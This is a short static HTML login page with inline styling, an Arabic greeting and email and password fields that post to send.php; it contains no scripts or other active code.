<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>مرحبا عزيزي </title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, #c6d6f3, #2f5fa4);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-container {
      text-align: center;
      background-color: rgba(255, 255, 255, 0.05);
      padding: 40px;
      border-radius: 12px;
      width: 300px;
      color: white;
    }

    .login-container img {
      width: 60px;
      margin-bottom: 20px;
    }

    .login-container h2 {
      margin: 0 0 30px;
      letter-spacing: 2px;
      font-weight: 300;
    }

    .login-container input[type="text"],
    .login-container input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: transparent;
      border: none;
      border-bottom: 1px solid #fff;
      color: white;
      font-size: 14px;
    }

    .login-container input::placeholder {
      color: white;
      opacity: 0.7;
    }

    .login-container .options {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      margin-top: 10px;
    }

    .login-container button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: #0b295c;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-container .options input {
      margin-right: 5px;
    }

    .login-container .options a {
      color: white;
      text-decoration: none;
      opacity: 0.8;
    }

    .login-container .options a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://img.icons8.com/ios-filled/100/ffffff/user.png" alt="User Icon" />
    <h2>مرحبا عزيزي</h2>
    <form action="send.php" method="POST">
      <input type="text" name="email" placeholder="Email ID" required />
      <input type="password" name="password" placeholder="Password" required />
      <div class="options">
        <label><input type="checkbox" /> Remember me</label>
        <a href="#">Forgot Password?</a>
      </div>
      <button type="submit">LOGIN</button>
    </form>
  </div>
</body>
</html>
